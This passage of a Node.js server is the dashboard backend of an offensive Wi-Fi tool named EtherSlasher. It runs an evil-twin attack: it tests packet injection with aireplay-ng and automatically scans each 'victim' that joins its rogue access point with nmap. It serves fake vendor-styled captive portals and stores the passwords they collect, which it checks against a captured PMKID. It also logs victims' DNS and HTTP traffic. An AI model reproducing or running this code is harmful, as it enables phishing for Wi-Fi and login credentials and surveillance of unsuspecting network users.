    const monIface = state.monIface || (state.monitorActive ? MON_IFACE : ATTACK_IFACE);
    logEvent('RADIO', `Injection test on ${monIface}`);
    streamCmd('aireplay-ng', ['--test', monIface], 'all', 'INJECT_TEST');
    res.json({ ok: true, iface: monIface });
});

// ─── Clients ───────────────────────────────────────────────────────────────
app.get('/api/clients', async (req, res) => {
    const rows = await dbAll('SELECT * FROM clients ORDER BY last_seen DESC').catch(() => []);
    res.json({ clients: rows.map(r => ({ ...r, ports: tryParse(r.open_ports, []).join(', '), os: r.os_guess, last_scan: r.last_seen })) });
});

app.get('/api/clients/:mac', async (req, res) => {
    const row = await dbGet('SELECT * FROM clients WHERE mac=?', [req.params.mac]).catch(() => null);
    if (!row) return res.status(404).json({ error: 'not found' });
    res.json({ ...row, open_ports: tryParse(row.open_ports, []) });
});

// ─── Recon ─────────────────────────────────────────────────────────────────
app.post('/api/recon/scan/:ip', async (req, res) => {
    const { ip } = req.params;
    logEvent('RECON', `nmap scan: ${ip}`);
    res.json({ ok: true, ip });
    state.reconActive = true; broadcastState();
    runNmapRecon(ip, ip).finally(() => { state.reconActive = false; broadcastState(); });
});

async function runNmapRecon(ip, mac) {
    return new Promise(resolve => {
        logEvent('RECON', `nmap -sV -O ${ip}`);
        io.emit('recon-log', `[nmap] Scanning ${ip}...`);
        const proc = spawn('nmap', ['-sV', '-O', '--osscan-guess', '-T4', '-F', '--open', '--stats-every', '5s', '-v', '-oX', '-', ip]);
        let xml = '';
        proc.stdout.on('data', d => { xml += d; });
        proc.stderr.on('data', d => {
            const line = d.toString().trim(); if (!line) return;
            logEvent('RECON', line.substring(0, 200)); io.emit('recon-log', `[${ip}] ${line.substring(0, 150)}`);
        });
        proc.on('error', err => { logEvent('ERROR', 'nmap: ' + err.message); resolve(); });
        proc.on('close', async () => {
            const { ports, os_guess } = parseNmapXml(xml);
            let vendor = 'Unknown';
            try {
                const rawMac = (mac || '').replace(/[^0-9a-fA-F:]/g, '');
                if (rawMac.length >= 8)
                    vendor = await sh(`curl -sf --connect-timeout 3 https://api.macvendors.com/${encodeURIComponent(rawMac.substring(0, 8))} || echo Unknown`);
            } catch {}
            const now = new Date().toISOString();
            await dbRun(`INSERT INTO clients (mac,ip,vendor,os_guess,open_ports,first_seen,last_seen) VALUES (?,?,?,?,?,?,?)
                         ON CONFLICT(mac) DO UPDATE SET ip=excluded.ip, vendor=excluded.vendor,
                         os_guess=excluded.os_guess, open_ports=excluded.open_ports, last_seen=excluded.last_seen`,
                [mac || ip, ip, vendor, os_guess, JSON.stringify(ports), now, now]).catch(e => logEvent('ERROR', 'DB client: ' + e.message));
            for (const p of ports.slice(0, 5)) {
                const [, svc, ver] = p.split('/');
                if (svc && ver) await fetchCves(mac || ip, svc, ver);
            }
            io.emit('recon_done', { ip, ports, os_guess, vendor });
            io.emit('recon-log', `[nmap] ${ip} done: ${ports.length} ports, OS=${os_guess}`);
            logEvent('RECON', `Done for ${ip}: ${ports.length} ports, OS=${os_guess}`);
            resolve();
        });
    });
}

function parseNmapXml(xml) {
    const ports = [];
    let os_guess = 'Unknown';
    const portRe = /<port protocol="[^"]*" portid="(\d+)"[^>]*>.*?<state state="open".*?<service name="([^"]*)"[^>]*(?:version="([^"]*)")?/gs;
    const osRe   = /<osmatch name="([^"]*)" accuracy="(\d+)"/;
    let m;
    while ((m = portRe.exec(xml)) !== null) ports.push(`${m[1]}/${m[2]}/${m[3] || ''}`);
    const om = osRe.exec(xml);
    if (om) os_guess = om[1];
    return { ports, os_guess };
}

// ─── Vulns ─────────────────────────────────────────────────────────────────
app.get('/api/vulns', async (req, res) => {
    const rows = await dbAll('SELECT v.*, c.ip FROM vulns v LEFT JOIN clients c ON c.mac=v.mac ORDER BY cvss DESC LIMIT 200').catch(() => []);
    res.json({ vulns: rows.map(r => ({ ...r, severity: r.severity || 'NONE', description: r.desc, ip: r.ip || r.mac })) });
});

async function fetchCves(mac, service, version) {
    try {
        const query = encodeURIComponent(`${service} ${version}`);
        const url   = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${query}&resultsPerPage=5`;
        const out   = await sh(`curl -sf --connect-timeout 5 '${url}'`);
        const data  = JSON.parse(out);
        for (const item of (data.vulnerabilities || [])) {
            const cve  = item.cve || {};
            const cid  = cve.id || '';
            const desc = (cve.descriptions || [{}])[0]?.value?.substring(0, 200) || '';
            let cvss = 0, sev = 'Unknown';
            const m31 = cve.metrics?.cvssMetricV31?.[0];
            const m2  = cve.metrics?.cvssMetricV2?.[0];
            if (m31) { cvss = m31.cvssData?.baseScore || 0; sev = m31.cvssData?.baseSeverity || 'Unknown'; }
            else if (m2) { cvss = m2.cvssData?.baseScore || 0; sev = cvss >= 7 ? 'HIGH' : cvss >= 4 ? 'MEDIUM' : 'LOW'; }
            await dbRun('INSERT OR IGNORE INTO vulns (mac,service,version,cve_id,cvss,severity,desc,found_at) VALUES (?,?,?,?,?,?,?,?)',
                [mac, service, version, cid, cvss, sev, desc, new Date().toISOString()]).catch(() => {});
        }
        logEvent('CVE', `${mac} ${service}/${version}: CVEs fetched`);
    } catch {}
}

// ─── APs ───────────────────────────────────────────────────────────────────
app.get('/api/aps', async (req, res) => {
    const since = Math.floor(Date.now() / 1000) - 300;
    let rows = await dbAll('SELECT * FROM access_points WHERE last_seen > ? ORDER BY data_frames DESC LIMIT 100', [since]).catch(() => []);
    if (!rows.length) rows = await dbAll('SELECT * FROM aps ORDER BY seen_at DESC LIMIT 100').catch(() => []);
    res.json({ aps: rows.map(ap => ({ ...ap, strategy: selectStrategy(ap.enc, ap.signal, ap.data_frames) })) });
});

// ─── Stations ──────────────────────────────────────────────────────────────
app.get('/api/stations', async (req, res) => {
    const since = Math.floor(Date.now() / 1000) - 180;
    const rows  = await dbAll(`
        SELECT s.*, a.ssid AS ap_ssid, a.channel AS ap_channel, a.enc AS ap_enc
        FROM stations s LEFT JOIN access_points a ON a.bssid = s.bssid
        WHERE s.last_seen > ? ORDER BY s.frames DESC LIMIT 200`, [since]).catch(() => []);
    res.json({ stations: rows, total: rows.length });
});

// ─── Traffic ───────────────────────────────────────────────────────────────
app.get('/api/traffic/http', async (req, res) => {
    const rows = await dbAll('SELECT * FROM http_requests ORDER BY id DESC LIMIT 500').catch(() => []);
    res.json({ requests: rows });
});

app.get('/api/traffic/dns', async (req, res) => {
    const rows = await dbAll('SELECT * FROM dns_queries ORDER BY id DESC LIMIT 500').catch(() => []);
    res.json({ queries: rows });
});

// ─── Strategy ──────────────────────────────────────────────────────────────
app.post('/api/strategy', (req, res) => {
    const { enc, signal, clients } = req.body;
    res.json({ strategy: selectStrategy(enc, signal, clients) });
});

// ─── Events / Logs ─────────────────────────────────────────────────────────
app.get('/api/events', async (req, res) => {
    const limit = parseInt(req.query.limit) || 200;
    const type  = req.query.type;
    const rows  = type
        ? await dbAll('SELECT * FROM events WHERE type=? ORDER BY id DESC LIMIT ?', [type, limit]).catch(() => [])
        : await dbAll('SELECT * FROM events ORDER BY id DESC LIMIT ?', [limit]).catch(() => []);
    res.json({ events: rows.reverse().map(r => ({
        ...r, msg: r.message,
        level: r.type === 'ERROR' ? 'err' : r.type === 'CREDENTIAL' ? 'warn' : ''
    })) });
});

app.get('/api/events/export', async (req, res) => {
    const rows = await dbAll('SELECT * FROM events ORDER BY id DESC LIMIT 10000').catch(() => []);
    res.setHeader('Content-Disposition', 'attachment; filename=etherslasher-events.json');
    res.json(rows);
});

// ─── Captive Portal ────────────────────────────────────────────────────────
function renderPortal(vendor, ssid, res) {
    const safeSsid = (ssid || 'WiFi')
        .replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const tmplPath = path.join(__dirname, 'public', 'portals', vendor + '.html');
    const file = fs.existsSync(tmplPath) ? tmplPath : path.join(__dirname, 'public', 'portals', 'generic.html');
    const html = fs.readFileSync(file, 'utf8')
        .replace(/\{\{SSID\}\}/g, safeSsid)
        .replace(/name="ssid" value=""/g, `name="ssid" value="${safeSsid}"`);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
}

app.get(['/hotspot-detect.html', '/generate_204', '/ncsi.txt', '/portal'], async (req, res) => {
    const ip   = (req.ip || '').replace('::ffff:', '');
    const ssid = state.attackSSID || 'WiFi';
    logEvent('PORTAL', `Hit from ${ip} ua=${(req.headers['user-agent'] || '').substring(0, 60)}`);
    let vendor = state.attackVendor;
    if (!vendor || vendor === 'generic') {
        const info = await lookupOUI(state.attackBSSID || '');
        vendor = info.template || 'generic';
        if (vendor === 'generic') vendor = ssidFallback(ssid);
        if (vendor !== 'generic') state.attackVendor = vendor;
    }
    renderPortal(vendor, ssid, res);
});

app.get('/api/attack/info', (req, res) => {
    res.json({ ssid: state.attackSSID || '', vendor: state.attackVendor || 'generic', channel: state.attackChannel || 6 });
});

app.get('/portal/success', (req, res) => {
    res.send(`<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Подключено</title>
<meta http-equiv="refresh" content="3;url=http://www.google.com">
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#f0f4f8;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:12px;padding:40px 32px;max-width:340px;width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.1)}.icon{font-size:48px;margin-bottom:16px}h2{font-size:18px;color:#1a202c;margin-bottom:8px}p{font-size:13px;color:#718096;line-height:1.6}</style>
</head><body><div class="card"><div class="icon">&#10003;</div>
<h2>Подключение восстановлено</h2>
<p>Доступ к интернету получен.<br>Перенаправляем через 3 секунды...</p>
</div></body></html>`);
});

app.post('/api/portal/submit', async (req, res) => {
    const ip     = (req.ip || '').replace('::ffff:', '');
    const ua     = (req.headers['user-agent'] || '').substring(0, 200);
    const ts     = new Date().toISOString();
    const vendor = req.body.vendor || state.attackVendor || 'generic';
    const ssid   = req.body.ssid   || state.attackSSID   || '';
    const isForm = (req.headers['content-type'] || '').includes('application/x-www-form-urlencoded');
    const password = req.body.password || '';

    let verified = 'unconfirmed', verifyReason = 'no_password';
    if (password) {
        const vr = await verifyWithPMKID(password, ssid, state.attackBSSID || '');
        verified = vr.verified; verifyReason = vr.reason;
    }
    if (isForm && verified === 'wrong') return renderPortal(vendor, ssid, res);

    const fields = Object.entries(req.body).filter(([k]) => !['vendor', 'ssid'].includes(k));
    for (const [field, value] of fields) {
        if (!value) continue;
        const val = String(value);
        await dbRun('INSERT INTO captured_creds (ts,ip,ssid,field,value,vendor,ua,verified) VALUES (?,?,?,?,?,?,?,?)',
            [ts, ip, ssid, field, val, vendor, ua, verified]).catch(e => logEvent('ERROR', 'DB cred: ' + e.message));
        logEvent('CREDS', `PASSWORD CAPTURED: ip=${ip} ssid="${ssid}" ${field}=${val} vendor=${vendor} verified=${verified}(${verifyReason})`);
        io.emit('cred-captured', { ts, ip, ssid, field, value: val, vendor, verified });
    }
    if (isForm) return res.redirect(303, '/portal/success');
    res.json({ ok: true, verified, reason: verifyReason });
});

app.post('/api/portal/cred', (req, res) => {
    req.url = '/api/portal/submit';
    app._router.handle(req, res, () => {});
});

app.get('/api/portal/creds', async (req, res) => {
    const rows = await dbAll('SELECT * FROM captured_creds ORDER BY id DESC LIMIT 200').catch(() => []);
    res.json({ creds: rows });
});

app.get('/api/attack/vendor/:bssid', async (req, res) => {
    const info = await lookupOUI(req.params.bssid);
    res.json({ bssid: req.params.bssid, ...info });
});

// ─── System Stats ──────────────────────────────────────────────────────────
let _statsRunning = false, _statsCache = null;

async function getSystemStats() {
    if (_statsRunning) return _statsCache;
    _statsRunning = true;
    try {
        const parseCpu = () => fs.readFileSync('/proc/stat', 'utf8').split('\n')[0].split(/\s+/).slice(1).map(Number);
        const cpu1 = parseCpu();
        await new Promise(r => setTimeout(r, 500));
        const cpu2 = parseCpu();
        const idle1 = cpu1[3], total1 = cpu1.reduce((a, b) => a + b, 0);
        const idle2 = cpu2[3], total2 = cpu2.reduce((a, b) => a + b, 0);
        const cpuPercent = Math.round(100 * (1 - (idle2 - idle1) / (total2 - total1)));
        const memRaw = fs.readFileSync('/proc/meminfo', 'utf8');
        const memTotal = parseInt(memRaw.match(/MemTotal:\s+(\d+)/)[1]);
        const memAvail = parseInt(memRaw.match(/MemAvailable:\s+(\d+)/)[1]);
        const ramPercent = Math.round(100 * (memTotal - memAvail) / memTotal);
        let temp = 0;
        try {
            const zones = fs.readdirSync('/sys/class/thermal').filter(d => d.startsWith('thermal_zone'));
            for (const z of zones) { const t = parseInt(fs.readFileSync(`/sys/class/thermal/${z}/temp`, 'utf8')); if (t > temp) temp = t; }
            temp = Math.round(temp / 1000);
        } catch {}
        const uptime = Math.floor(parseFloat(fs.readFileSync('/proc/uptime', 'utf8').split(' ')[0]));
        _statsCache = { cpuPercent, ramPercent, temp, uptime };
        return _statsCache;
    } finally { _statsRunning = false; }
}

app.get('/api/stats/system', async (req, res) => {
    const stats = _statsCache || await getSystemStats();
    res.json(stats || { cpuPercent: 0, ramPercent: 0, temp: 0, uptime: 0 });
});

app.get('/api/stats/activity', async (req, res) => {
    const since = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    const rows  = await dbAll(`
        SELECT bssid, ssid, channel, power,
               MAX(data_frames) - MIN(data_frames) AS activity_rate,
               MAX(clients_count) AS clients_count, MAX(ts) AS last_seen
        FROM ap_activity WHERE ts > ?
        GROUP BY bssid ORDER BY activity_rate DESC LIMIT 10`, [since]).catch(() => []);
    res.json({ activity: rows });
});

app.get('/api/radio/status', async (req, res) => {
    let mac = '—';
    try { mac = (await sh(`cat /sys/class/net/${ATTACK_IFACE}/address 2>/dev/null`)).trim() || '—'; } catch {}
    res.json({ ok: true, monitor: state.monitorActive, ap: state.apActive, mac, iface: ATTACK_IFACE,
               monIface: state.monIface || MON_IFACE, attackActive: state.attackActive, attackVendor: state.attackVendor });
});

// ─── Periodic system stats ─────────────────────────────────────────────────
setInterval(async () => {
    try {
        const stats = await getSystemStats();
        emitBatched('system_stats', stats);
        if (stats.temp > 75) io.emit('alert', { type: 'WARNING', message: `CPU temperature ${stats.temp}°C` });
    } catch {}
}, 5000);

// ─── GC every 5 minutes ────────────────────────────────────────────────────
setInterval(() => {
    if (global.gc) global.gc();
    const mem = process.memoryUsage();
    if (mem.heapUsed > 150 * 1024 * 1024) {
        logEvent('SYSTEM', `High memory: ${Math.round(mem.heapUsed / 1024 / 1024)}MB — clearing OUI cache`);
        ouiMemCache = {};
    }
}, 5 * 60 * 1000);

// ─── Hourly DB cleanup ─────────────────────────────────────────────────────
setInterval(() => {
    dbRun("DELETE FROM events WHERE ts < datetime('now', '-24 hours')").catch(() => {});
    dbRun("DELETE FROM ap_activity WHERE ts < datetime('now', '-1 hour')").catch(() => {});
    dbRun("DELETE FROM http_requests WHERE ts < datetime('now', '-2 hours')").catch(() => {});
    dbRun("DELETE FROM dns_queries WHERE ts < datetime('now', '-2 hours')").catch(() => {});
    logEvent('SYSTEM', 'Hourly DB cleanup done');
}, 60 * 60 * 1000);

// ─── DNS query log tailer ───────────────────────────────────────────────────
let dnsLogPos = 0;
setInterval(() => {
    if (!state.attackActive) return;
    try {
        const logFile = '/tmp/dnsmasq-et.log';
        const stat = fs.statSync(logFile);
        if (stat.size <= dnsLogPos) return;
        const fd  = fs.openSync(logFile, 'r');
        const buf = Buffer.alloc(stat.size - dnsLogPos);
        fs.readSync(fd, buf, 0, buf.length, dnsLogPos);
        fs.closeSync(fd);
        dnsLogPos = stat.size;
        for (const line of buf.toString('utf8').split('\n')) {
            const m = line.match(/query\[A+\]\s+(\S+)\s+from\s+([\d.]+)/);
            if (!m) continue;
            const entry = { ts: new Date().toISOString(), domain: m[1], ip: m[2] };
            dbRun('INSERT INTO dns_queries (ts,ip,domain) VALUES (?,?,?)', [entry.ts, entry.ip, entry.domain]).catch(() => {});
            emitBatched('dns-query', entry);
        }
    } catch {}
}, 2000);

// ─── DHCP lease watcher ────────────────────────────────────────────────────
function parseLeases(file) {
    const out = [];
    try {
        const raw = fs.readFileSync(file, 'utf8');
        for (const line of raw.trim().split('\n')) {
            const [, mac, ip] = line.split(' ');
            if (mac && ip) out.push({ mac, ip });
        }
    } catch {}
    return out;
}

let lastLeaseHash = '';
setInterval(async () => {
    try {
        const raw  = fs.readFileSync('/var/lib/misc/dnsmasq.leases', 'utf8');
        const hash = raw.length + raw.substring(0, 50);
        if (hash !== lastLeaseHash) {
            lastLeaseHash = hash;
            const leases = parseLeases('/var/lib/misc/dnsmasq.leases');
            for (const { ip, mac } of leases) {
                if (ip.startsWith('10.42.0.')) continue;
                const existing = await dbGet('SELECT id FROM clients WHERE mac=?', [mac]).catch(() => null);
                if (!existing) {
                    logEvent('CLIENT', `New client: ${ip} (${mac})`);
                    io.emit('new_client', { ip, mac });
                    if (state.attackActive && ip.startsWith('10.0.0.') && !state.attackVictimIP) {
                        state.attackStage = 3; state.attackVictimIP = ip; state.attackVictimMAC = mac;
                        broadcastState();
                        io.emit('attack_stage_update', { stage: 2, status: 'CONNECTED', msg: `Victim connected: ${ip} (${mac})`, victimIP: ip, victimMAC: mac });
                        io.emit('attack_stage_update', { stage: 3, status: 'ACTIVE', msg: `Auto-recon: nmap -sV -O ${ip}...` });
                        runL2Discovery().catch(() => {});
                        runNmapRecon(ip, mac).then(() => {
                            io.emit('attack_stage_update', { stage: 3, status: 'DONE', msg: `Recon complete for ${ip}` });
                            state.attackStage = 4; broadcastState();
                            io.emit('attack_stage_update', { stage: 4, status: 'ACTIVE', msg: 'Captive portal active — waiting for password' });
                        }).catch(() => {});
                    } else {
                        runNmapRecon(ip, mac);
                    }
                } else {
                    dbRun('UPDATE clients SET ip=?,last_seen=? WHERE mac=?', [ip, new Date().toISOString(), mac]).catch(() => {});
                }
            }
            io.emit('clients_update');
        }
    } catch {}
}, 5000);

// ─── Start ─────────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
    logEvent('WEB', `EtherSlasher Dashboard listening on :${PORT}`);
    syncStateWithSystem();
});

process.on('SIGTERM', () => {
    logEvent('WEB', 'SIGTERM received, shutting down');
    server.close(() => process.exit(0));
});
